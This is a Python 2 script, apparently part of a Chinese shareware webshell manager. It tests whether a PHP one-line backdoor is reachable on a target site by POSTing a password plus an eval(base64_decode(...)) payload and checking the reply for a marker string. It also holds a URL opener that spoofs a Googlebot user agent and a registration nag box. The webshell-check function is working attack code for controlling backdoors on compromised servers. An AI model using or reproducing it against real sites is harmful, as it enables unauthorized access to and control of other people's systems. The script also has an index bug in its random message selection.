#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import ctypes   #messagebox      MessageBox(None, str(hs), u'提示', 0)
MessageBox = ctypes.windll.user32.MessageBoxA


import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)

##############################一句话测试  和上传
def yi_cs_php(url,PASS):  #一句话测试
    try:
        print type(url)
        print url,"------",PASS
        params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygicXE6MjYwMjE1OTk0NiIpO2RpZSgpOw=="  #echo("qq:2602159946");die();
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()

            print data

            if "qq:2602159946" in data:
                return 1

        except Exception,e:
            print "1111111111111111111111111111111",e
            return 0

    except Exception,e:
        print "111111111111111111111111111111111111111111111111111111",e
        return 0

        ##############################
import urllib2
import time
def open_url(url,tm):
    try:
        req = urllib2.Request(url)
        req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
        urllib2.urlopen(req,timeout=tm)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        time.sleep(1)
        return 1
    except:
        return 0

import os
import webbrowser
from ctypes import *
import random #随机数
user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
if __name__=='__main__':
#    #print yi_cs_php("http://webxscan.com/x.php","long")  #一句话测试
#    qs = QtCore.QString(u'http://webxscan.com/x.php')
#    qs1 = QtCore.QString(u'long')
#    #print unicode(qs).encode("gb2312")
#    print yi_cs_php(str(qs),str(qs1))

    #os.startfile('126')
    a=[u"大哥",u"伙计",u"哥们",u"大叔",u"财神爷",u"大地主"]
    b=[u"就花钱注册个吧！！",u"写个东西不容易啊真心的！",u"日子不好过啊注册下！！",u"注册下OK混口饭吃！！",u"码农不容易啊哎注册下！@@@",u"赞助俺下后面会有更多好东西！"]
    s1=random.randrange(0, 7)
    s2=random.randrange(0, 7)
    pp=u"未注册版本只允许添加20行数据\n%s\n%s\n"%(a[s1],b[s2])
    #print pp
    user32.MessageBoxW(0,c_wchar_p(pp), c_wchar_p("QQ:1043733492"), 0)   # 调用MessageBoxA函数




